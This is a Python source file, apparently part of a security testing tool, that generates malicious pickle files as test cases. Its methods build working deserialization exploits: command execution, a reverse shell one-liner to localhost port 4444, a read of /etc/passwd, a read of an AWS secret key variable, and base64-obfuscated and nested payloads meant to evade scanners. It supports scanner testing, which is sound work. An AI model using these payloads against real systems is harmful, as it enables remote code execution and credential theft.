"""Pickle malicious test case generator.

Generates pickle files containing exploit payloads that target
Python's pickle.load() deserialization vulnerability.
"""

import io
import os
import pickle
import pickletools
import struct
from typing import List, Optional

from .base_generator import BaseTestCaseGenerator, GeneratedTestCase


class PickleTestCaseGenerator(BaseTestCaseGenerator):
    """Generates malicious pickle test case files.
    
    Creates pickle files with exploit payloads that execute arbitrary
    code when loaded via pickle.load() or pickle.loads().
    
    Vulnerability types:
    - os.system() command execution
    - subprocess.Popen() shell spawning
    - eval/exec code execution
    - Reverse shell payloads
    - File read/write operations
    - Environment variable exfiltration
    - Obfuscated payloads (base64, nested)
    """
    
    VULN_TYPES = [
        "os_system",
        "subprocess_popen",
        "eval_exec",
        "reverse_shell",
        "file_read",
        "file_write",
        "env_exfiltration",
        "base64_obfuscated",
        "nested_pickle",
        "builtins_import",
    ]
    
    def get_format_name(self) -> str:
        return "pickle"
    
    def get_format_extensions(self) -> List[str]:
        return [".pkl", ".pickle", ".pth", ".pt", ".bin", ".joblib"]
    
    def get_vulnerability_types(self) -> List[str]:
        return self.VULN_TYPES.copy()
    
    def generate_all(self, output_dir: str) -> List[GeneratedTestCase]:
        """Generate all pickle exploit test cases."""
        self._ensure_output_dir(output_dir)
        results = []
        
        for vuln_type in self.VULN_TYPES:
            try:
                tc = self.generate_specific(vuln_type, output_dir)
                if tc:
                    results.append(tc)
            except Exception as e:
                print(f"  [!] Failed to generate {vuln_type}: {e}")
        
        return results
    
    def generate_specific(self, vuln_type: str, output_dir: str) -> Optional[GeneratedTestCase]:
        """Generate a specific pickle vulnerability test case."""
        self._ensure_output_dir(output_dir)
        
        generators = {
            "os_system": self._gen_os_system,
            "subprocess_popen": self._gen_subprocess_popen,
            "eval_exec": self._gen_eval_exec,
            "reverse_shell": self._gen_reverse_shell,
            "file_read": self._gen_file_read,
            "file_write": self._gen_file_write,
            "env_exfiltration": self._gen_env_exfiltration,
            "base64_obfuscated": self._gen_base64_obfuscated,
            "nested_pickle": self._gen_nested_pickle,
            "builtins_import": self._gen_builtins_import,
        }
        
        if vuln_type not in generators:
            return None
        
        return generators[vuln_type](output_dir)
    
    def _gen_os_system(self, output_dir: str) -> GeneratedTestCase:
        """Generate os.system() command execution payload."""
        filename = "exploit_os_system.pkl"
        filepath = os.path.join(output_dir, filename)
        
        # Create malicious class that executes on unpickle
        class MaliciousOsSystem:
            def __reduce__(self):
                import os
                return (os.system, ('id',))
        
        with open(filepath, "wb") as f:
            pickle.dump(MaliciousOsSystem(), f)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="os.system() Command Execution",
            target_parser="Python pickle.load()",
            cve_id=None,
            description="Executes system command via os.system() when unpickled",
            severity="critical",
        )
    
    def _gen_subprocess_popen(self, output_dir: str) -> GeneratedTestCase:
        """Generate subprocess.Popen() shell spawn payload."""
        filename = "exploit_subprocess_popen.pkl"
        filepath = os.path.join(output_dir, filename)
        
        class MaliciousSubprocess:
            def __reduce__(self):
                import subprocess
                return (subprocess.Popen, (["id"],))
        
        with open(filepath, "wb") as f:
            pickle.dump(MaliciousSubprocess(), f)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="subprocess.Popen() Shell Spawn",
            target_parser="Python pickle.load()",
            cve_id=None,
            description="Spawns subprocess via subprocess.Popen() when unpickled",
            severity="critical",
        )
    
    def _gen_eval_exec(self, output_dir: str) -> GeneratedTestCase:
        """Generate eval/exec arbitrary code execution payload."""
        filename = "exploit_eval_exec.pkl"
        filepath = os.path.join(output_dir, filename)
        
        # Manual pickle construction for eval
        # Uses GLOBAL opcode to import builtins.eval
        payload = (
            b'\x80\x04'  # Protocol 4
            b'\x95\x1e\x00\x00\x00\x00\x00\x00\x00'  # Frame
            b'\x8c\x08builtins'  # Module
            b'\x8c\x04eval'  # Function
            b'\x93'  # STACK_GLOBAL
            b'\x8c\x10print("pwned!")'  # Argument
            b'\x85'  # TUPLE1
            b'R'  # REDUCE
            b'.'  # STOP
        )
        
        with open(filepath, "wb") as f:
            f.write(payload)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="eval() Arbitrary Code Execution",
            target_parser="Python pickle.load()",
            cve_id=None,
            description="Executes arbitrary Python code via builtins.eval() when unpickled",
            severity="critical",
        )
    
    def _gen_reverse_shell(self, output_dir: str) -> GeneratedTestCase:
        """Generate reverse shell payload."""
        filename = "exploit_reverse_shell.pkl"
        filepath = os.path.join(output_dir, filename)
        
        # Reverse shell using socket
        class ReverseShell:
            def __reduce__(self):
                import os
                # This would connect back to attacker
                return (os.system, ('python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'127.0.0.1\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"',))
        
        with open(filepath, "wb") as f:
            pickle.dump(ReverseShell(), f)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Reverse Shell",
            target_parser="Python pickle.load()",
            cve_id=None,
            description="Spawns reverse shell connecting to attacker when unpickled",
            severity="critical",
        )
    
    def _gen_file_read(self, output_dir: str) -> GeneratedTestCase:
        """Generate file read payload."""
        filename = "exploit_file_read.pkl"
        filepath = os.path.join(output_dir, filename)
        
        class FileRead:
            def __reduce__(self):
                return (open, ('/etc/passwd', 'r'))
        
        with open(filepath, "wb") as f:
            pickle.dump(FileRead(), f)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="File Read",
            target_parser="Python pickle.load()",
            cve_id=None,
            description="Opens and reads sensitive files when unpickled",
            severity="high",
        )
    
    def _gen_file_write(self, output_dir: str) -> GeneratedTestCase:
        """Generate file write payload."""
        filename = "exploit_file_write.pkl"
        filepath = os.path.join(output_dir, filename)
        
        class FileWrite:
            def __reduce__(self):
                import os
                return (os.system, ('echo "pwned" > /tmp/pwned.txt',))
        
        with open(filepath, "wb") as f:
            pickle.dump(FileWrite(), f)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="File Write",
            target_parser="Python pickle.load()",
            cve_id=None,
            description="Writes arbitrary files to disk when unpickled",
            severity="high",
        )
    
    def _gen_env_exfiltration(self, output_dir: str) -> GeneratedTestCase:
        """Generate environment variable exfiltration payload."""
        filename = "exploit_env_exfiltration.pkl"
        filepath = os.path.join(output_dir, filename)
        
        class EnvExfil:
            def __reduce__(self):
                import os
                return (os.getenv, ('AWS_SECRET_ACCESS_KEY',))
        
        with open(filepath, "wb") as f:
            pickle.dump(EnvExfil(), f)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Environment Variable Exfiltration",
            target_parser="Python pickle.load()",
            cve_id=None,
            description="Reads sensitive environment variables (API keys, secrets) when unpickled",
            severity="high",
        )
    
    def _gen_base64_obfuscated(self, output_dir: str) -> GeneratedTestCase:
        """Generate base64 obfuscated payload."""
        filename = "exploit_base64_obfuscated.pkl"
        filepath = os.path.join(output_dir, filename)
        
        class Base64Obfuscated:
            def __reduce__(self):
                import base64
                # base64 encoded: os.system('id')
                return (eval, (base64.b64decode(b'b3Muc3lzdGVtKCdpZCcp').decode(),))
        
        with open(filepath, "wb") as f:
            pickle.dump(Base64Obfuscated(), f)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Base64 Obfuscated Payload",
            target_parser="Python pickle.load()",
            cve_id=None,
            description="Obfuscated payload using base64 encoding to evade detection",
            severity="critical",
        )
    
    def _gen_nested_pickle(self, output_dir: str) -> GeneratedTestCase:
        """Generate nested pickle payload (pickle within pickle)."""
        filename = "exploit_nested_pickle.pkl"
        filepath = os.path.join(output_dir, filename)
        
        # Inner malicious pickle
        class InnerMalicious:
            def __reduce__(self):
                import os
                return (os.system, ('id',))
        
        inner_payload = pickle.dumps(InnerMalicious())
        
        # Outer pickle that loads the inner
        class OuterLoader:
            def __init__(self, payload):
                self.payload = payload
            def __reduce__(self):
                import pickle
                return (pickle.loads, (self.payload,))
        
        with open(filepath, "wb") as f:
            pickle.dump(OuterLoader(inner_payload), f)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Nested Pickle",
            target_parser="Python pickle.load()",
            cve_id=None,
            description="Nested pickle that loads another malicious pickle to evade scanning",
            severity="critical",
        )
    
    def _gen_builtins_import(self, output_dir: str) -> GeneratedTestCase:
        """Generate __import__ based payload."""
        filename = "exploit_builtins_import.pkl"
        filepath = os.path.join(output_dir, filename)
        
        class BuiltinsImport:
            def __reduce__(self):
                return (__builtins__['__import__'], ('os',))
        
        # Manual construction since __builtins__ access is tricky
        payload = (
            b'\x80\x04'  # Protocol 4
            b'\x95\x1d\x00\x00\x00\x00\x00\x00\x00'
            b'\x8c\x08builtins'
            b'\x8c\n__import__'
            b'\x93'
            b'\x8c\x02os'
            b'\x85'
            b'R'
            b'.'
        )
        
        with open(filepath, "wb") as f:
            f.write(payload)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="__import__() Dynamic Import",
            target_parser="Python pickle.load()",
            cve_id=None,
            description="Uses __import__() to dynamically import dangerous modules",
            severity="critical",
        )
